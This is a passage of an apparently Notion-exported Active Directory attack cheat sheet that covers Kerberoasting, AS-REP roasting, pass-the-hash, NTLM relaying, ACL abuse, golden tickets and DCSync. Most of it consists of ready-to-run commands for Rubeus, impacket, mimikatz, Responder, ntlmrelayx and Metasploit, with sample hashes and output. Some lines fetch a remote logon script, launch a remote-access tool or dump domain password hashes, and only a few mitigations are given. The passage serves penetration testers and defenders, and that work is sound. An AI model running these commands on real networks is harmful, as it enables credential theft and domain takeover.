769cbf891b51d736ffe474899eec8df64abef319d3c6dc379f2bfda33de7c3a1a50d6ece564d4559c77f560b7506fa2f1c9af7162f1247ea35706aafffde48b8cc48b1ec8e99d99ac81dc02f55f43f9726d746383cd076e7199070ff8100846ba9dc2235e92d0c7dac1f33da5fe7901e02f0566030d7c7e02535d6a300292a04e6c32d0d74d37679c2617750f5920d9c697a30c883519bc6b5a916eec354459c7f248c783bd79c436a7e8c463a8981a9e000d21c2d00c7e8468cff0ab695cb3aa4f14f149d1fafb4d656bcd1f67b747fc4c2d648466a386774853db8d50c22df57e747085142f98f5f06191c243b9dbf671da64228364f058c7e2e53a80fdde7f6dc2f25459a09fb2583757953247c222d64f49bc12d461d2e5aa572ceba2605d7eafd6031405ee422ac35cbf041b4fd28e58d871406e053d1a806de49056791646c175bf0d2aaa19f844bfc885520e19c391702be6ae61122fceac32b689764334908a4eaf7c69974a9519ebb068a15c087955fb402416bd184fd2</code></pre><p id="d3248094-7da6-48a9-af97-864ff8405e98" class="">Alternatively with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a></p><pre id="9762cc9c-33d4-473c-8e9e-fc0ee15fc973" class="code"><code>.\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt</code></pre><p id="2b29160e-55a6-44bf-978f-3d952b33b4dc" class="">Alternatively on macOS machine you can use <a href="https://github.com/its-a-feature/bifrost">bifrost</a></p><pre id="e8b79885-7dd6-4a77-9dd6-67f139810124" class="code"><code>./bifrost -action asktgs -ticket doIF&lt;...snip...&gt;QUw= -service host/dc1-lab.lab.local -kerberoast true</code></pre><p id="e0183c95-a184-40a0-971b-59743c1b4ded" class="">Then crack the ticket with hashcat or john</p><pre id="d2a6e718-2ffd-4145-8980-abbfe8f3a244" class="code"><code>hashcat -m 13100 -a 0 hash.txt crackstation.txt
./john ~/hash.txt --wordlist=rockyou.lst</code></pre><p id="06eabb6c-8732-46c6-88d0-6fac288d7b40" class="">Mitigations:</p><ul id="724540b1-e7c0-4c0a-8957-a6d77aedd848" class="bulleted-list"><li>Have a very long password for your accounts with SPNs (&gt; 25 characters)</li></ul><ul id="2af3db01-3055-4938-a0f9-a2b5d6123a93" class="bulleted-list"><li>Make sure no users have SPNs</li></ul><h3 id="209d425e-87db-402e-85d8-b2a4d80edaf7" class="">KRB_AS_REP Roasting</h3><p id="719f032d-d16a-4413-b5ce-c0baf03a6c03" class="">If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting</p><p id="0eaf2853-2ac0-43ef-b1cd-5dcd37908152" class="">Prerequisite:</p><ul id="93c6534f-5860-4109-85a7-f8dfe2b579c5" class="bulleted-list"><li>Accounts have to have <strong>DONT_REQ_PREAUTH</strong></li></ul><pre id="3b4b0a38-29d7-4944-a958-7a3d5e987a5d" class="code"><code>C:\&gt;git clone https://github.com/GhostPack/Rubeus#asreproast
C:\Rubeus&gt;Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast

 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.3.4


[*] Action: AS-REP roasting

[*] Target User            : TestOU3user
[*] Target Domain          : testlab.local

[*] SamAccountName         : TestOU3user
[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
[*] Using domain controller: testlab.local (192.168.52.100)
[*] Building AS-REQ (w/o preauth) for: &#x27;testlab.local\TestOU3user&#x27;
[*] Connecting to 192.168.52.100:88
[*] Sent 169 bytes
[*] Received 1437 bytes
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

    $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...

C:\Rubeus&gt; john --wordlist=passwords_kerb.txt hashes.asreproast</code></pre><p id="47486449-2314-446c-a3be-8432596696dd" class="">Using <code>impacket</code> to get the hash and <code>hashcat</code> to crack it.</p><pre id="5e48685c-6d94-4bfe-801c-465c9d997b53" class="code"><code># extract hashes
root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast

# crack AS_REP messages
root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt</code></pre><h3 id="9d8e6648-98f0-4b7d-8c7a-0cb93decf56b" class="">Pass-the-Hash</h3><p id="259ec65f-da75-4e79-8b97-b88c56a384bf" class="">The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren‚Äôt the built-in RID 500.</p><pre id="a51fc930-ce1b-4c77-97bc-3d9000e4c4ad" class="code"><code>use exploit/windows/smb/psexec
set RHOST 10.2.0.3
set SMBUser jarrieta
set SMBPass nastyCutt3r  
# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
# NOTE2: Require the full NTLM hash, you may need to add the &quot;blank&quot; LM (aad3b435b51404eeaad3b435b51404ee)
set PAYLOAD windows/meterpreter/bind_tcp
run
shell</code></pre><p id="f15b8bc1-122f-4c0f-a843-fa006e649241" class="">or with crackmapexec</p><pre id="7a51a040-7333-43c1-b97c-8731af6aad50" class="code"><code>cme smb 10.2.0.2 -u jarrieta -H &#x27;aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d&#x27; -x &quot;whoami&quot;
also works with net range : cme smb 10.2.0.2/24 ...</code></pre><p id="46b5cbb9-da6c-4795-8875-6e27836a8a1d" class="">or with psexec</p><pre id="5b3225d6-0c33-4212-ad95-e9f714dae114" class="code"><code>proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d</code></pre><p id="a07d6696-4cc7-4fd9-8430-796d1391e44b" class="">or with the builtin Windows RDP and mimikatz</p><pre id="bfb53951-2130-4166-a4ea-d97eeb9e2095" class="code"><code>sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user&#x27;s ntlm hash&gt; /run:&quot;mstsc.exe /restrictedadmin&quot;</code></pre><p id="9e4dbcf5-bb4a-4e32-827b-d6ff30fa9b4e" class="">You can extract the local SAM database to find the local administrator hash :</p><pre id="c884d9f2-47e7-4aed-a420-31f7afe01701" class="code"><code>C:\&gt; reg.exe save hklm\sam c:\temp\sam.save
C:\&gt; reg.exe save hklm\security c:\temp\security.save
C:\&gt; reg.exe save hklm\system c:\temp\system.save
$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></pre><h3 id="11c5e6ca-59fc-428d-af5e-20d97e786ff6" class="">OverPass-the-Hash (pass the key)</h3><p id="ca704cae-2457-4619-b3e6-0d9e970d0e42" class="">Request a TGT with only the NT hash then you can connect to the machine using the TGT.</p><h3 id="2e778f3a-e027-4da5-a70b-a686faa8b183" class="">Using impacket</h3><pre id="8fe80f95-6bb1-4130-8293-5e8186deeac2" class="code"><code>root@kali:impacket-examples$ python ./getTGT.py -hashes :1a59bd44fe5bec39c44c8cd3524dee lab.ropnop.com
root@kali:impacket-examples$ export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
root@kali:impacket-examples$ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass

also with the AES Key if you have it
root@kali:impacket-examples$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com

ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
klist</code></pre><h3 id="b79ae3ae-c41b-4d69-bb2a-f612554dd411" class="">Using Rubeus</h3><pre id="6d6ce419-808f-44a9-a4fd-fc9185a88408" class="code"><code>C:\Users\triceratops&gt;.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
C:\Users\triceratops&gt;.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd</code></pre><h3 id="892cdcf1-3910-4a75-8c17-e7275689d2a0" class="">Capturing and cracking NTLMv2 hashes</h3><p id="c9854043-7c76-4a41-bb92-e303f6c5f943" class="">If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network.</p><pre id="60de5827-42b1-4508-a3bb-3d31b1d98332" class="code"><code>python Responder.py -I eth0</code></pre><p id="d9a046be-063f-4afa-b633-5dccbf87c744" class="">Then crack the hash with <code>hashcat</code></p><pre id="ffb96b22-6e06-4bc0-8faa-66701cbd19af" class="code"><code>hashcat -m 5600 -a 0 hash.txt crackstation.txt</code></pre><h3 id="8202f9d8-307c-4bf2-9726-09cb5c9f422c" class="">NTLMv2 hashes relaying</h3><p id="f78de816-832a-46bb-8b78-6ba3f1df0756" class="">NTLMv1 and NTLMv2 can be relayed to connect to another machine.</p><div id="8b8e41ce-e02f-4e38-bfd9-421d8b87e757" class="collection-content"><h4 class="collection-title"></h4><table class="collection-content"><thead><tr><th>Hash</th><th>Hashcat</th><th>Attack method</th></tr></thead><tbody><tr id="9633d73a-f137-45ed-a586-380d0555f159"><td class="cell-title"><a href="Active%20Directory%20Attacks/Untitled%20Database/LM.html">LM</a></td><td class="cell-y\bV">3000</td><td class="cell-Gycx">crack/pass the hash</td></tr><tr id="6e8e2acc-450c-41fc-a203-7e518206629d"><td class="cell-title"><a href="Active%20Directory%20Attacks/Untitled%20Database/NTLM%20NTHash.html">NTLM/NTHash</a></td><td class="cell-y\bV">1000</td><td class="cell-Gycx">crack/pass the hash</td></tr><tr id="9338d912-04fa-4398-9556-c7b2386d54d6"><td class="cell-title"><a href="Active%20Directory%20Attacks/Untitled%20Database/NTLMv1%20Net%20NTLMv1.html">NTLMv1/Net-NTLMv1</a></td><td class="cell-y\bV">5500</td><td class="cell-Gycx">crack/relay attack</td></tr><tr id="0d49bae4-acca-48c9-a3cf-d359515c9f2f"><td class="cell-title"><a href="Active%20Directory%20Attacks/Untitled%20Database/NTLMv2%20Net%20NTLMv2.html">NTLMv2/Net-NTLMv2</a></td><td class="cell-y\bV">5600</td><td class="cell-Gycx">crack/relay attack</td></tr></tbody></table></div><h3 id="6065ec8b-8d1d-443e-ab62-1e53522ab6a7" class="">MS08-068 NTLM reflection</h3><p id="8c256884-8abe-48da-8513-bfe5048edc88" class="">NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.</p><blockquote id="c8d9affe-fe93-4efd-ae8b-c2e7403a0ca5" class="">This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim‚Äôs own credentials.</blockquote><ul id="72ee9af9-e954-44c5-8d8d-235a78fb17a1" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068</a></li></ul><pre id="e03fe0eb-09cc-489e-958c-95a2daf931a5" class="code"><code>msf &gt; use exploit/windows/smb/smb_relay
msf exploit(smb_relay) &gt; show targets</code></pre><h3 id="b6231bae-66f9-459e-b020-f3c5c7dea298" class="">SMB Signing Disabled and IPv4</h3><p id="8adea387-08c8-4c14-88b7-64da96630c83" class="">If a machine has <code>SMB signing</code>:<code>disabled</code>, it is possible to use Responder with Multirelay.py script to perform an <code>NTLMv2 hashes relay</code> and get a shell access on the machine.</p><ol id="ee1581eb-58ae-4306-a24a-882b8142f366" class="numbered-list" start="1"><li>Open the Responder.conf file and set the value of <code>SMB</code> and <code>HTTP</code> to <code>Off</code>.<pre id="d5b3e7ba-fa73-45a8-9e55-c5f4ace22c94" class="code"><code>[Responder Core]
; Servers to start
...
SMB = Off     # Turn this off
HTTP = Off    # Turn this off</code></pre></li></ol><ol id="048aa0dc-ffd6-4b3a-95ac-dfaca572f3a7" class="numbered-list" start="2"><li>Run <code>python RunFinger.py -i IP_Range</code> to detect machine with <code>SMB signing</code>:<code>disabled</code>.</li></ol><ol id="a6412d74-e43b-4bcb-a620-4b694f65e93e" class="numbered-list" start="3"><li>Run <code>python Responder.py -I &lt;interface_card&gt;</code> and <code>python MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL</code></li></ol><ol id="200de10d-f2b8-4624-98df-8b4faf7e3a20" class="numbered-list" start="4"><li>Also you can use <code>ntlmrelayx</code> to dump the SAM database of the targets in the list.<pre id="952958ba-0d40-4af5-a10d-e5da22f99dcf" class="code"><code>ntlmrelayx.py -tf targets.txt</code></pre></li></ol><ol id="237a7a6b-8deb-4071-8cfe-98bfe657d928" class="numbered-list" start="5"><li>ntlmrelayx can also act as a SOCK proxy with every compromised sessions.<pre id="1e6265e1-394e-4573-b4a2-0543d5f6e567" class="code"><code>$ ntlmrelayx.py -tf /tmp/targets.txt -socks -smb2support
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx&gt; socks
Protocol  Target          Username                  Port
--------  --------------  ------------------------  ----
MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433

$ proxychains smbclient //192.168.48.230/Users -U contoso/normaluser1
$ proxychains mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth</code></pre></li></ol><p id="e5bb8623-2663-4bd1-9581-e7d59f76c003" class="">Mitigations:</p><ul id="765b3bc0-74a5-45b3-93c5-5ce235eb846f" class="bulleted-list"><li>Disable LLMNR via group policy<pre id="c8907ee0-ee5a-42bb-9f9e-7bc17f1616a4" class="code"><code>Open gpedit.msc and navigate to Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; Turn off multicast name resolution and set to Enabled</code></pre></li></ul><ul id="12c9217e-52d6-4a55-b941-cfbdc1515b11" class="bulleted-list"><li>Disable NBT-NS<pre id="2c6b5b12-f752-4c3d-bd77-4772bb5ee7d8" class="code"><code>This can be achieved by navigating through the GUI to Network card &gt; Properties &gt; IPv4 &gt; Advanced &gt; WINS and then under &quot;NetBIOS setting&quot; select Disable NetBIOS over TCP/IP</code></pre></li></ul><h3 id="e9a9d290-fe71-4614-9bc2-1c312001adbb" class="">SMB Signing Disabled and IPv6</h3><p id="f92ffbf5-078e-4b5d-99e7-03d9de391d7a" class="">Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.</p><pre id="498b737e-913a-40b9-bd6d-aff40d657b77" class="code"><code>cme smb $hosts --gen-relay-list relay.txt

# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6
mitm6 -i eth0 -d $domain

# spoofing WPAD and relaying NTLM credentials
ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
or 
ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug</code></pre><h3 id="5c6920e3-35b5-48c7-804a-024f2bc71bad" class="">Drop the MIC</h3><blockquote id="e845ce37-bc1c-4f68-a9a7-c16a7671b33b" class="">The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP</blockquote><p id="4c5bbb98-e1a0-4e46-9c0c-7de8483da16f" class="">Check vulnerability with <a href="https://github.com/fox-it/cve-2019-1040-scanner">cve-2019-1040-scanner</a></p><pre id="79f1d131-0da8-4847-b639-c9560b480d28" class="code"><code>python2 scanMIC.py &#x27;DOMAIN/USERNAME:PASSWORD@TARGET&#x27;
[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
[*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)</code></pre><ul id="8530e514-d84b-4432-a572-03b68d8c35c0" class="bulleted-list"><li>Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD<pre id="17417236-958a-49a6-9843-10d8cbab57d4" class="code"><code>TERM1&gt; python printerbug.py testsegment.local/testuser@s2012exc.testsegment.local &lt;attacker ip/hostname&gt;
TERM2&gt; ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
TERM1&gt; secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc</code></pre></li></ul><ul id="cb926340-fe1e-45b1-8145-2a435d8eb1d8" class="bulleted-list"><li>Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.<pre id="9e7f1a89-5d80-435f-81f9-62f5ccdfbe1c" class="code"><code># create a new machine account
TERM1&gt; ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
TERM2&gt; python printerbug.py relaytest.local/testuser@second-dc-server 10.0.2.6
TERM1&gt; getST.py -spn host/second-dc-server.local &#x27;relaytest.local/MACHINE$:PASSWORD&#x27; -impersonate DOMAIN_ADMIN_USER_NAME

# connect using the ticket
export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
secretsdump.py -k -no-pass second-dc-server.local -just-dc</code></pre></li></ul><h3 id="911bdb02-45b6-400b-a8ea-2ef3ef35fa81" class="">Ghost Potato - CVE-2019-1384</h3><p id="85f60271-fb2c-415c-94ca-c59ee6228186" class="">Prerequisites:</p><ul id="6aef6f58-d473-43e9-828e-9f38f40f74c3" class="bulleted-list"><li>User must be a member of the local Administrators group</li></ul><ul id="2f7450ea-c3e7-40df-b555-e47acbd3d031" class="bulleted-list"><li>User must be a member of the Backup Operators group</li></ul><ul id="c7b167f9-b199-417d-99e4-793b36d9234f" class="bulleted-list"><li>Token must be elevated</li></ul><p id="b363df5b-b9f5-435e-85cf-68e56e88e1d4" class="">Using a modified version of ntlmrelayx : <a href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip">https://shenaniganslabs.io/files/impacket-ghostpotato.zip</a></p><pre id="555be529-b6b7-437c-a20e-2f5f1d80e44e" class="code"><code>ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe</code></pre><h3 id="f6963122-41a4-4dd1-b55a-b6d9c3b4e98f" class="">Dangerous Built-in Groups Usage</h3><p id="97a3cf46-7dcb-4944-8687-35a30124aa65" class="">If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object &quot;CN=AdminSDHolder,CN=System,&quot; or set &quot;adminCount&quot; attribute to 0 for the required objec</p><p id="81a94732-b27b-401d-b042-642a534a1a44" class="">AdminSDHolder</p><pre id="b290ef4f-b90a-4017-bbdb-2618a65c5e90" class="code"><code>Get-ADUser -LDAPFilter &quot;(objectcategory=person)(samaccountname=*)(admincount=1)&quot;
Get-ADGroup -LDAPFilter &quot;(objectcategory=group) (admincount=1)&quot;
or
([adsisearcher]&quot;(AdminCount=1)&quot;).findall()</code></pre><h3 id="cc570582-de50-44f9-a565-97c10f42983c" class="">AdminSDHolder Abuse</h3><p id="a0bed177-4ccd-4ff9-8127-9c8fa433bb80" class="">if you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp</p><pre id="2909ee31-4e6d-4de6-a95e-15d6ac1008b0" class="code"><code># right to reset password for toto using the account titi
Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
# give all rights
Add-ObjectAcl -TargetADSprefix &#x27;CN=AdminSDHolder,CN=System&#x27; -PrincipalSamAccountName toto -Verbose -Rights All</code></pre><h3 id="7f7bfa0b-3f9e-4df0-a15b-b58b88e7fe9d" class="">Abusing Active Directory ACLs/ACEs</h3><ul id="794bbd73-1dc9-4f6b-b18a-c0366c887a51" class="bulleted-list"><li><strong>GenericAll on User</strong> : We can reset user&#x27;s password without knowing the current password</li></ul><ul id="120d2ef1-8163-4026-a5e3-1c997d2489a4" class="bulleted-list"><li><strong>GenericAll on Group</strong> : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : <code>net group &quot;domain admins&quot; spotless /add /domain</code></li></ul><ul id="186bf76c-5cbf-4c35-be0b-47d987b7dd00" class="bulleted-list"><li><strong>WriteProperty on Group</strong> : We can again add ourselves to the Domain Admins group and escalate privileges: <code>net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName &quot;domain admins&quot; -Domain &quot;offense.local&quot;; net user spotless /domain</code></li></ul><ul id="b800bce8-0999-4554-8a38-decc5693fdf8" class="bulleted-list"><li><strong>Self (Self-Membership) on Group</strong> : Another privilege that enables the attacker adding themselves to a group</li></ul><ul id="efcce4f9-79dd-4ff0-88b5-d9c359ca8c84" class="bulleted-list"><li><strong>ForceChangePassword</strong> : we can reset the user&#x27;s password without knowing their current password: <code>$c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose</code></li></ul><ul id="5c3a77c5-0419-4674-9022-560129e53cf2" class="bulleted-list"><li><strong>GenericWrite on User</strong> : WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : <code>Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue &quot;\\10.0.0.5\totallyLegitScript.ps1</code></li></ul><ul id="9b6c5bc9-2677-430d-8022-c6dc8db7b837" class="bulleted-list"><li><strong>WriteDACL</strong> : It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. <a href="https://github.com/fox-it/Invoke-ACLPwn">Invoke-ACLPwn</a> is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : <code>./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username &#x27;testuser&#x27; -Domain &#x27;xenoflux.local&#x27; -Password &#x27;Welcome01!&#x27;</code> <pre id="a5ab3be0-474c-4650-ad4c-5e4c504fcde5" class="code"><code># give DCSync right to titi
Add-ObjectACL -TargetDistinguishedName &quot;dc=dev,dc=testlab,dc=local&quot; -PrincipalSamAccountName titi -Rights DCSync</code></pre></li></ul><p id="a2adaf5f-ef4d-45a1-bbc6-879ba7c62da0" class="">Check ACL for an User with <a href="https://github.com/canix1/ADACLScanner">ADACLScanner</a>.</p><pre id="c5dfec86-97fa-42f4-b7f8-4b88a155ce6e" class="code"><code>ADACLScan.ps1 -Base &quot;DC=contoso;DC=com&quot; -Filter &quot;(&amp;(AdminCount=1))&quot; -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show</code></pre><h3 id="1084c0a2-52e2-4793-aad4-1592e9ea1f46" class="">Trust relationship between domains</h3><ul id="023c930a-6fb4-4c3a-9740-6cec197655a2" class="bulleted-list"><li>One-way<ul id="672eee9f-196d-447c-86b8-8912a0f6bc04" class="bulleted-list"><li>Domain B trusts A</li></ul><ul id="e8c14c16-d046-49cd-87f6-d7a9cb3ac3aa" class="bulleted-list"><li>Users in Domain A can access resources in Domain B</li></ul><ul id="53352dd0-f5a8-492e-8491-3157b08e1009" class="bulleted-list"><li>Users in Domain B cannot access resources in Domain A</li></ul></li></ul><ul id="d3fb0ca2-9dd4-4ae5-916a-f9987a2c26d3" class="bulleted-list"><li>Two-way<ul id="b42c80e5-dd99-41ad-96fc-00ab47f65253" class="bulleted-list"><li>Domain A trusts Domain B</li></ul><ul id="1ce2c79c-7637-4d28-9bac-a5937ec12c79" class="bulleted-list"><li>Domain B trusts Domain A</li></ul><ul id="42da1489-a324-484d-8236-03a0d5ef09e9" class="bulleted-list"><li>Authentication requests can be passed between the two domains in both directions</li></ul></li></ul><h3 id="d4db6338-d1ff-45af-9fdd-c8c6bac342db" class="">Enumerate trusts between domains</h3><pre id="03baa9d5-4154-436f-9621-d142c2d774e3" class="code"><code>nltest /trusted_domains</code></pre><p id="68fc6711-becc-4940-b4fc-0dd1f403e1dc" class="">or</p><pre id="7f59addd-4ad9-4ae3-9636-35c34e38ecc9" class="code"><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

SourceName          TargetName                    TrustType      TrustDirection
----------          ----------                    ---------      --------------
domainA.local      domainB.local                  TreeRoot       Bidirectional</code></pre><h3 id="0d7bd671-a7d5-451a-85d8-dcbc0cb59aca" class="">Exploit trusts between domains</h3><p id="98b43b18-c6d0-4382-83f5-9f169e44685f" class="">‚ö†Ô∏è Require a Domain-Admin level access to the current domain.</p><div id="8811e2e6-1e99-4423-86d2-ec84b083a74d" class="collection-content"><h4 class="collection-title"></h4><table class="collection-content"><thead><tr><th>Source</th><th>Target</th><th>Technique to use</th><th>Trust relationship</th></tr></thead><tbody><tr id="aa88c001-7e7e-445f-9138-14a3ac17abd7"><td class="cell-title"><a href="Active%20Directory%20Attacks/Untitled%20Database%201/Root.html">Root</a></td><td class="cell-=dfM">Child</td><td class="cell-&gt;C&gt;e">Golden Ticket + Enterprise Admin group (Mimikatz /groups)</td><td class="cell-WoZw">Inter Realm (2-way)</td></tr><tr id="64e088e5-0e00-4cda-b8f8-5cea42c906ba"><td class="cell-title"><a href="Active%20Directory%20Attacks/Untitled%20Database%201/Child.html">Child</a></td><td class="cell-=dfM">Child</td><td class="cell-&gt;C&gt;e">SID History exploitation (Mimikatz /sids)</td><td class="cell-WoZw">Inter Realm Parent-Child (2-way)</td></tr><tr id="2136970f-b018-4f1e-8b03-483285743291"><td class="cell-title"><a href="Active%20Directory%20Attacks/Untitled%20Database%201/Child%201.html">Child</a></td><td class="cell-=dfM">Root</td><td class="cell-&gt;C&gt;e">SID History exploitation (Mimikatz /sids)</td><td class="cell-WoZw">Inter Realm Tree-Root (2-way)</td></tr><tr id="220c6dce-61df-46f2-98aa-547b3f9c639f"><td class="cell-title"><a href="Active%20Directory%20Attacks/Untitled%20Database%201/Forest%20A.html">Forest A</a></td><td class="cell-=dfM">Forest B</td><td class="cell-&gt;C&gt;e">PrinterBug + Unconstrained delegation ?</td><td class="cell-WoZw">Inter Realm Forest or External (2-way)</td></tr></tbody></table></div><h3 id="12ed92f5-9427-4e43-801e-5d79ca1c4644" class="">Child Domain to Forest Compromise - SID Hijacking</h3><p id="2175131d-d30d-45ac-9105-7c7f2c31e299" class="">Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root.</p><p id="6df07833-ec2b-47ac-acee-16058b9c3501" class="">Prerequisite:</p><ul id="efb52aa3-c239-44e5-947e-aae6e0801cab" class="bulleted-list"><li>KRBTGT Hash</li></ul><ul id="75137c0a-65fd-483e-a97b-539a7ee21a99" class="bulleted-list"><li>Find the SID of the domain<pre id="48414b85-2aa4-4c3d-80db-9ef907678486" class="code"><code>$ Convert-NameToSid target.domain.com\krbtgt
S-1-5-21-2941561648-383941485-1389968811-502</code></pre></li></ul><ul id="463e084b-3259-4c6e-bd8a-983053e5dd73" class="bulleted-list"><li>Replace 502 with 519 to represent Enterprise Admins</li></ul><ul id="116dd409-1bb8-43ee-a8af-1e23f0879115" class="bulleted-list"><li>Create golden ticket and attack parent domain.<pre id="b447b706-32d7-4699-9d90-9ebc58d75ac6" class="code"><code>kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt</code></pre></li></ul><h3 id="b26db0c2-de5e-40f7-a251-ce7c229e4cf3" class="">Kerberos Unconstrained Delegation</h3><blockquote id="75616980-8ccb-4a8d-b69d-cb5a325dc1cb" class="">The user sends a TGS to access the service, along with their TGT, and then the service can use the user‚Äôs TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</blockquote><p id="8f6e96b6-40cf-4bf5-a34e-de5fd1608ca8" class="">Domain Compromise via DC Print Server and Unconstrained Delegation</p><p id="a2e99aa1-c149-4793-860f-88b8b4932cb2" class="">Prerequisites:</p><ul id="19d807e7-c7dc-4496-83b9-7d0f4fcf5b86" class="bulleted-list"><li>Object with Property &quot;Trust this computer for delegation to any service (Kerberos only)&quot;</li></ul><ul id="f857efcd-2a6b-44de-a06d-e149ce9f4f2c" class="bulleted-list"><li>Must have ADS_UF_TRUSTED_FOR_DELEGATION</li></ul><ul id="6480a9e9-5cd4-4bb7-b517-3bbc497d9430" class="bulleted-list"><li>Must not have ADS_UF_NOT_DELEGATED flag</li></ul><h3 id="32731b29-ee24-417d-bd81-f40ffda298d7" class="">Find delegation</h3><p id="c66b94ef-9453-4f12-88e2-99705d31639f" class="">Check the <code>TrustedForDelegation</code> property.</p><pre id="1d257575-b1aa-4e5c-a98f-65544ff04044" class="code"><code># From https://github.com/samratashok/ADModule
PS&gt; Get-ADComputer -Filter {TrustedForDelegation -eq $True}

or 

$&gt; ldapdomaindump -u &quot;DOMAIN\\Account&quot; -p &quot;Password123*&quot; 10.10.10.10   
